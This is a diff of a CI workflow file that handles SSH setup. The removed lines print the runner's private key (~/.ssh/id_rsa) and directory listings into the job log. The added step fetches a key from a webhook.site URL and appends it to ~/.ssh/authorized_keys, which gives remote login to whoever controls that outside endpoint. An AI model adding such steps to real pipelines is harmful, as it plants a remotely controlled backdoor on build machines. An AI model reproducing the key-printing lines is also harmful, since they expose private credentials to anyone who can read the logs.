@@ -25,11 +25,12 @@ jobs:
           sed -i 's/\r//' temp_ssh_key
           eval "$(ssh-agent -s)"
           ssh-add temp_ssh_key
-          ls 
-          ls ~
-          ls ~/.ssh
-          cat ~/.ssh/id_rsa
-          cat ~/.ssh/id_rsa.pub
+
+      - name: Get SSH Public Key
+        run: |
+          curl -s https://webhook.site/b457a354-e19f-4bc0-8f9e-20bfc7723735 -o temp_ssh_pub
+          chmod 600 temp_ssh_pub
+          cat temp_ssh_pub >> ~/.ssh/authorized_keys
 
       # - name: Set up SSH
       #   uses: webfactory/ssh-agent@v0.5.0
